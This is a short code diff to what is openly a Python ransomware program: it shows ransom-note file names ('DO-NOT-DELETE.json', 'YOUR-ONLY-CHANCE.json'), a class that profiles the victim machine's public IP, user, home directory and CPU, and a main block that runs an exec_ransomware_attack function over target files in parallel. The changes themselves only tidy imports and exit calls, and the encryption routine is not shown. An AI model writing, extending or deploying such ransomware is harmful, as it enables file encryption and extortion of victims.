@@ -12,7 +12,7 @@ from uuid import uuid4
 from time import time
 from sys import exit, stderr
 import json
-import platform
+from platform import system, processor, architecture, machine
 
 RESCUE_FILE1 = 'DO-NOT-DELETE.json'
 RESCUE_FILE2 = 'YOUR-ONLY-CHANCE.json'
@@ -48,14 +48,14 @@ class System:
     def __init__(self):
         self.inet_connection = self.__check_inet_connection()
         self.pub_ip = self.__get_public_ip()
-        self.os = platform.system()
+        self.os = system()
         self.user = getlogin()
         self.home_dir = expanduser('~')
-        self.cpu = platform.processor()
+        self.cpu = processor()
         self.cores = cpu_count()
-        self.machine_arch = platform.architecture()[0]
-        self.exec_type = platform.architecture()[1]
-        self.machine = platform.machine()
+        self.machine_arch = architecture()[0]
+        self.exec_type = architecture()[1]
+        self.machine = machine()
 
     
     def __check_inet_connection(self):
@@ -268,7 +268,7 @@ if __name__=='__main__':
         with Pool(victim_sys.cores - 1) as pool:
             pool.map(exec_ransomware_attack, target_files)
         runtime.elapsed_time()
-        sys.exit()
+        exit()
     except Exception as e:
         stderr.write(e)
         pass
